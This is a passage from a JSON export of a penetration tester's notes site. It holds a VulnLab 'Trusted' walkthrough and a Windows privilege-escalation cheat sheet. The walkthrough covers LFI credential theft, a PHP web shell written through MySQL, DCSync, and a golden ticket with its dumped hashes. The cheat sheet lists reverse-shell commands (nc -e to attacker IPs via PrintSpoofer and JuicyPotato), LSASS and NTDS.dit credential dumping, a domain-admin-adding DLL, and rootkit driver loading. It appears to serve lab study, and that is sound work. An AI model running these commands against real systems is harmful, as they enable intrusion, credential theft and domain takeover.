2024-07-27T03:53:49 |_Not valid after: 2025-01-26T03:53:49 |_ssl-date: 2024-07-28T04:08:58+00:00; -1s from scanner time. | rdp-ntlm-info: | Target_Name: LAB | NetBIOS_Domain_Name: LAB | NetBIOS_Computer_Name: LABDC | DNS_Domain_Name: lab.trusted.vl | DNS_Computer_Name: labdc.lab.trusted.vl | DNS_Tree_Name: trusted.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-07-28T04:08:50+00:00 Service Info: Host: LABDC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2024-07-28T04:08:52 |_ start_date: N/A\rffuf we discover /dev/ and an LFI that help us to read db.php : http://10.10.196.22/dev/index.html?view=php://filter/convert.base64-encode/resource=../dev/db.php\rdb.php: \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;SuperSecureMySQLPassw0rd1337.\u0026#34;; $conn = mysqli_connect($servername, $username, $password); if (!$conn) { die(\u0026#34;Connection failed: \u0026#34; . mysqli_connect_error()); } echo \u0026#34;Connected successfully\u0026#34;; ?\u0026gt;\rAccess to mysql server : mysql -u root -h 10.10.196.22 -p\rResult : MariaDB [news]\u0026gt; select * from users; +----+------------+--------------+-----------+----------------------------------+ | id | first_name | short_handle | last_name | password | +----+------------+--------------+-----------+----------------------------------+ | 1 | Robert | rsmith | Smith | 7e7abb54bbef42f0fbfa3007b368def7 | | 2 | Eric | ewalters | Walters | d6e81aeb4df9325b502a02f11043e0ad | | 3 | Christine | cpowers | Powers | e3d3eb0f46fe5d75eed8d11d54045a60 | +----+------------+--------------+-----------+----------------------------------+ 3 rows in set (0.022 sec) MariaDB [news]\u0026gt;\rCrack : 7e7abb54bbef42f0fbfa3007b368def7:IHateEric2\rEnum : netexec wmi $t2 -u usernames.txt -p \u0026#39;IHateEric2\u0026#39; RPC 10.10.196.22 135 LABDC [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl) RPC 10.10.196.22 135 LABDC [+] lab.trusted.vl\\rsmith:IHateEric2\rGot a shell with mysql server : select \u0026#39;\u0026lt;?php echo \u0026#34;command: \u0026#34; . system($_REQUEST[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; into outfile \u0026#34;C:\\\\xampp\\\\htdocs\\\\dev\\\\shell.php\u0026#34;;\rUser VL{349efd4b1ccbeb4d3ca0108fa5cc5802}\nTrust Relationship : Invoke-WebRequest -Uri \u0026#34;http://10.8.3.12:8080/PowerView.ps1\u0026#34; -OutFile \u0026#34;C:\\Users\\administrator\\Desktop\\powerview.ps1\u0026#34; Import-Module ./PowerView.ps1 Get-NetDomainTrust\rThe SID for the child domain and parents Get-DomainSID # Child Get-DomainGroup -Domain trusted.vl -Identity \u0026#34;Enterprise Admins\u0026#34; \\| select distinguishedname,objectsid`\rAlso we can use Mimikatz : lsadump::trust\rCurrent domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866) Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591-519)\rThe KRBTGT hash for the child domain: using DCSync Attack : mimikatz # lsadump::dcsync /all /csv Result : [DC] \u0026#39;lab.trusted.vl\u0026#39; will be the domain [DC] \u0026#39;labdc.lab.trusted.vl\u0026#39; will be the DC server [DC] Exporting domain \u0026#39;lab.trusted.vl\u0026#39; 1104 rsmith 30ef48d2054363df9244bc0d476e93dd 66048 502 krbtgt c7a03c565c68c6fac5f8913fab576ebd 514 1106 ewalters 56d93bd5a8250652c7430a4467a8540a 66048 500 Administrator 75878369ad33f35b7070ca854100bc07 66048 1107 cpowers 322db798a55f85f09b3d61b976a13c43 66048 1000 LABDC$ c101e5fcd553128d23a62df1c509a576 532480 1103 TRUSTED$ 182161c2718e1d45b2202d6e35a7eb6e 2080\rCreating Golden ticket : mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt\rDump NTDS : lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all #Then connect with the hash win evil-winrm evil-winrm -i 10.10.185.69 -u \u0026#39;Administrator\u0026#39; -H \u0026#39;15db914be1e6a896e7692f608a9d72ef\u0026#39;\rChange user pass and run ranascs to read the flag : Root VL{1ffd4561083a1bdbb4e15346ba7aaf31}\n","date":"2023-09-07","id":112,"permalink":"/notes/lab/vulnlab/trusted/","summary":"\u003cp\u003eScan 1 :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT      STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp    open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp    open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-07-28 04:01:47Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp   open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp   open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: trusted.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp   open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp   open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp   open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: trusted.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-07-28T04:02:50+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e 0s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etrusteddc.trusted.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-07-27T03:53:47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-01-26T03:53:47\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: TRUSTED\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: TRUSTED\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: TRUSTEDDC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: trusted.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: trusteddc.trusted.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-07-28T04:02:42+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-HTTPAPI/2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Not Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e9389/tcp  open  mc-nmf        .NET Message Framing\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 \u003cspan class=\"o\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-title: Not Found\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_http-server-header: Microsoft-HTTPAPI/2.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49664/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49665/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49666/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49667/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49668/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49672/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49678/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49687/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e49988/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e56896/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e63538/tcp open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: TRUSTEDDC\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-07-28T04:02:43\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eScan 2 :\u003c/p\u003e","tags":[],"title":"Trusted"},{"content":" Upgrade 1: python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; echo $TERM stty -a #speed 38400 baud; rows 46; columns 174; line = 0; export SHELL=bash export TERM=xterm256-color stty rows 46 columns 174\r","date":"2023-09-07","id":113,"permalink":"/notes/shell-and-payload/upgrade/","summary":"\u003cul\u003e\n\u003cli\u003eUpgrade 1:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython3 -c \u003cspan class=\"s1\"\u003e\u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$TERM\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estty -a\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#speed 38400 baud; rows 46; columns 174; line = 0;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eSHELL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebash\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eTERM\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003exterm256-color\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003estty rows \u003cspan class=\"m\"\u003e46\u003c/span\u003e columns \u003cspan class=\"m\"\u003e174\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Upgrade"},{"content":"","date":"2023-09-07","id":114,"permalink":"/notes/web/web-cache/","summary":"","tags":[],"title":"Web Cache"},{"content":"Information Gathering #Windows_Enumeration\nNetwork Information:\narp -a route print\rList hidden file :\ncmd /c dir /A\rChange password of user\nnet user Administrator Password1234 #for the whole doamin : net user Administrator Password1234 /domain\rList Symbolic link :\ndir /AL /S c:\\\rEnumerating Protections:\nGet-MpComputerStatus Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\rTesting App-Locker Security:\nGet-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\\Windows\\System32\\cmd.exe -User Everyone\rUseful Information:\ntasklist /svc set systeminfo wmic qfe #or Get-HotFix | ft -AutoSize\rInstalled Programs:\nwmic product get name #or Get-WmiObject -Class Win32_Product | select Name, Version #or Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname / Get-ItemProperty \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#34; | select displayname\rPermission on a file :\nGet-ACl file.txt\rDisplay Running Processes:\nnetstat -ano\rLogged-In Users:\nquery user query session\rCurrent User and Privileges:\necho %USERNAME% whoami /priv\rSee Encrypted file on the system :\nCIPHER /u /n\rGet All Groups:\nnet localgroup\rPassword Policy \u0026amp; Other Account Information:\nnet accounts net user\rListing Named Pipes:\nDownload pipelist.exe from https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist pipelist.exe /accepteula #or gci \\\\.\\pipe\\ #or Get-ChildItem \u0026#34;\\\\.\\pipe\\\u0026#34; | Where-Object { -not $_.PsIsContainer } | ForEach-Object { Write-Output \u0026#34;Named Pipe: $($_.FullName)\u0026#34; }\rEnumerating Permissions:\nDownload accesschk from https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk Download accesschk: Invoke-WebRequest -Uri \u0026#34;http://10.10.16.100:8080/accesschk64.exe\u0026#34; -OutFile \u0026#34;C:\\Users\\htb-student\\Desktop\\accesschk64.exe\u0026#34;\rExecute accesschk: accesschk /accepteula \\\\.\\Pipe\\lsass -v #for lsass #with powershell .\\accesschk64.exe \\pipe\\SQLLocal\\SQLEXPRESS01 -v Get Installed Programs via PowerShell \u0026amp; Registry Keys PS C:\\htb\u0026gt; $INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation PS C:\\htb\u0026gt; $INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation PS C:\\htb\u0026gt; $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize\rWindows User Privileges NT AUTHORITY / LOCAL SERVICE https://github.com/itm4n/FullPowers\nEnable privilege like impersonate : whoami FullPower.exe\rSeImpersonate and SeAssignPrimaryToken: #SeImpersonate #SeAssignPrimaryToken\nNetCat:\nDownload Netcat: wget https://github.com/int0x33/nc.exe/blob/master/nc.exe\rPrintSpoofer:\nDownload PrintSpoofer: wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe\rRun command: C:\\Tools\\PrintSpoofer.exe -c \u0026#34;c:\\tools\\nc.exe 10.10.16.100 8443 -e cmd\u0026#34;\rJuicy Potatoes:\nDownload JuicyPotato: wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe\rRun command: c:\\tools\\JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \u0026#34;/c c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd.exe\u0026#34; -t *\rhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer\nSeDebugPrivilege #SeDebugPrivilege #Enable_Privilege\n**Enable privileges **\nDownload script : wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1\rEnable all privileges : Import-Module .\\EnableAllTokenPrivs.ps1 .\\EnableAllTokenPrivs.ps1 whoami /priv\rResources : https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/ https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77 Migrate Process\nGet LSASS process id: ps Migrate the process with the meterpreter : migrate \u0026lt;pid\u0026gt;\rDump LSASS:\nDownload procdump.exe: wget https://download.sysinternals.com/files/Procdump.zip\rRun procdump: procdump.exe -accepteula -ma lsass.exe lsass.dmp\rDownload Mimikatz: wget https://github.com/ParrotSec/mimikatz/tree/master/x64\rUse Mimikatz: mimikatz.exe mimikatz # log mimikatz # sekurlsa::minidump lsass.dmp mimikatz # sekurlsa::logonpasswords\rDump Locally : pypykatz lsa minidump lsass.dmp\rhttps://github.com/skelsec/pypykatz\nTools:\nDownload psgetsystem from: wget https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1\rRun command: import-module .\\psgetsys.ps1 Get-Process winlogon [MyProcess]::CreateProcessFromParent(\u0026#34;552\u0026#34;,\u0026#34;c:\\windows\\system32\\cmd.exe\u0026#34;, \u0026#34;/c c:\\windows\\temp\\nc.exe 127.0.0.1 4444 -e cmd.exe\u0026#34;)\rDownload SeDebugPrivilegePoC from: wget https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC\rSeTakeOwnershipPrivilege: #SeTakeOwnershipPrivilege\nView File Ownership:\nGet-ChildItem -Path \u0026#39;C:\\Department Shares\\Private\\IT\\cred.txt\u0026#39; | select name,directory, @{Name=\u0026#34;Owner\u0026#34;;Expression={(Get-ACL $_.Fullname).Owner}} cmd /c dir /q \u0026#39;C:\\Department Shares\\Private\\IT\u0026#39;\rChange File Ownership:\ntakeown /f \u0026#39;C:\\Department Shares\\Private\\IT\\cred.txt\u0026#39; icacls \u0026#39;C:\\Department Shares\\Private\\IT\\cred.txt\u0026#39; /grant htb-student:F\rWindows Group Privileges Backup Operators #Backup_Operators\nCopying a Protected File:\nDownload modules: wget https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug\rImport modules: Import-Module .\\SeBackupPrivilegeUtils.dll Import-Module .\\SeBackupPrivilegeCmdLets.dll\rEnable SeBackupPrivilege: Set-SeBackupPrivilege Get-SeBackupPrivilege\rCopy Protected file: Copy-FileSeBackupPrivilege \u0026#39;C:\\Confidential\\2021 Contract.txt\u0026#39; .\\Contract.txt\rCopying NTDS.dit:\nDownload Robocopy : wget https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy\rUse Diskshadow : diskshadow.exe DISKSHADOW\u0026gt; set verbose on DISKSHADOW\u0026gt; set metadata C:\\Windows\\Temp\\meta.cab DISKSHADOW\u0026gt; set context clientaccessible DISKSHADOW\u0026gt; set context persistent DISKSHADOW\u0026gt; begin backup DISKSHADOW\u0026gt; add volume C: alias cdrive DISKSHADOW\u0026gt; create DISKSHADOW\u0026gt; expose %cdrive% E: DISKSHADOW\u0026gt; end backup DISKSHADOW\u0026gt; exit #You can put all this command in a script.txt and exec diskshadow.exe -s script.exe\rRun Robocopy: robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit\rCopying NTDS.dit Locally : Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit\r#SeBackupPrivilege : Extract local account credentials :\nExtracting Sytem and Sam : reg save HKLM\\SYSTEM SYSTEM.SAV reg save HKLM\\SAM SAM.SAV\rUse Impacket : secretsdump.py -sam SAM.SAV -system SYSTEM.SAV LOCAL\r**Extracting Credentials from NTDS.dit : **\nDownload DSInternals : wget https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1\rUse DSInternals: Import-Module .\\DSInternals.psd1 $key = Get-BootKey -SystemHivePath .\\SYSTEM Get-ADDBAccount -DistinguishedName \u0026#39;CN=administrator,CN=users,DC=inlanefreight,DC=local\u0026#39; -DBPath .\\ntds.dit -BootKey $key\rUse Impacket : secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL\rEvent Log Readers #Event_Log_Readers\nConfirming Group Membership : net localgroup \u0026#34;Event Log Readers\u0026#34;\rSearching Security Logs : wevtutil qe Security /rd:true /f:text | Select-String \u0026#34;/user\u0026#34;\rSearching Security Logs with Credential : wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr \u0026#34;/user\u0026#34;\rSearching Security Logs Using Get-WinEvent : Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like \u0026#39;*/user*\u0026#39;} | Select-Object @{name=\u0026#39;CommandLine\u0026#39;;expression={ $_.Properties[8].Value }}\rDnsAdmins #DnsAdmins\nLeveraging DnsAdmins Access\nGenerating Malicious DLL : msfvenom -p windows/x64/exec cmd=\u0026#39;net group \u0026#34;domain admins\u0026#34; netadm /add /domain\u0026#39; -f dll -o adduser.dll\rConfirming Group Membership : Get-ADGroupMember -Identity DnsAdmins\rLoading Custom DLL : dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\rCheck restart DNS Privilege :\nFinding User\u0026rsquo;s SID : wmic useraccount where name=\u0026#34;netadm\u0026#34; get sid\rChecking Permissions on DNS Service : sc.exe sdshow DNS\rRestart Dns service : sc stop dns sc start dns\rConfirming Group Membership : net group \u0026#34;Domain Admins\u0026#34; /dom\rDon't forget to logout or restart your sessions to apply the change !!\nUsing Mimilib.dll\nAs detailed in this post, we could also utilize mimilib.dll from the creator of the Mimikatz tool to gain command execution by modifying the kdns.c file to execute a reverse shell one-liner or another command of our choosing.\nCreating a WPAD Record\nDisabling the Global Query Block List Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local\rAdding a WPAD Record Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.16.100\r`Use a tool such as Responder or Inveigh to perform traffic spoofing, and attempt to capture password hashes '\nPrint Operators #Print_Operators\nEnable EnableSeLoadDriverPrivilege\nif no there is no SeLoadDriverPrivileg we need to bypass UAC Bypass UAC : https://github.com/hfiref0x/UACME\rDownload EnableSeLoadDriverPrivilege : curl -o https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp EnableSeLoadDriverPrivilege.cpp\rCompile with cl.exe : cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp\rEnable EnableSeLoadDriverPrivilege : EnableSeLoadDriverPrivilege.exe\rLoad Capcom.sys\nDownload Capcom.sys: curl Capcom.sys -o https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys\rAdd Reference to Driver: reg add HKCU\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d 